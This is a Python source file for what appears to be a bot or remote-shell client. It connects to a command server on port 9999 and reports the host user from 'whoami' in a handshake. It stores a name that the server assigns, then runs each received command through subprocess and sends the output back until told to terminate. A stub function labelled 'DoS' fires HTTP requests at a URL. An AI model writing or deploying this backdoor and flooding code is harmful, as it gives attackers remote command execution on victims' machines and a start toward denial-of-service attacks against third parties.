import socket
import os
import subprocess
import shlex
import requests


def execute(cmd):
    # Removing whitespace from both the sides
    cmd = cmd.strip().lower()
    split = cmd.split()
    if not cmd:
        return
    elif split[0]=="cd":
        try:
            directory =''
            i = 1
            while i < len(split):
                directory += split[i]
                i += 1
            print(directory)
            os.chdir(directory)
            print("Hogya")
            output = os.getcwd()
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        print(output)
        return output
    else:
        output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT).decode()
        #output = subprocess.getoutput(cmd)
        print(output)
        return output

def DoS(headers="",url="http://httpbin.org/post",option='p'):
    if option == 'p':
        r = requests.post(url,headers=headers)
    elif option == 'g':
        r = requests.get(url,headers=headers)
    print(r.text)

def Handshake(socket):
    if os.path.exists("myInfo"):
        with open("myInfo","r") as f:
            name = f.readline()
        socket.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
        response = socket.recv(4096)
        print(response.decode())
        return response.decode()
    else:
        socket.send(b"New Connection from '" + bytes(subprocess.getoutput('whoami'),'utf-8') + b"'. Please name the system!")
        response = socket.recv(4096)
        if response.decode():
            print("Sever assigned name: " + response.decode())
            with open("myInfo","a+") as f:
                f.write(response.decode())
        return 'ACK'
    #Receive data
    

def main():
    target_host = 'localhost'
    target_port = 9999
    #Creating a socket
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setblocking(True)
    #Connect the client
    server.connect((target_host,target_port))
    response = ''
    ack = Handshake(server)
    if ack == 'ACK':
        #Wait until command is sent
        while response != 'terminate':
            response = server.recv(4096)
            print("Hello")
            print(response.decode())
            if response:
                #print(execute(response.decode()))
                server.send(bytes(execute(response.decode()),'utf-8'))
    DoS(option='g',url='http://httpbin.org/get')
    x = input(":")

if __name__ == '__main__':
    main()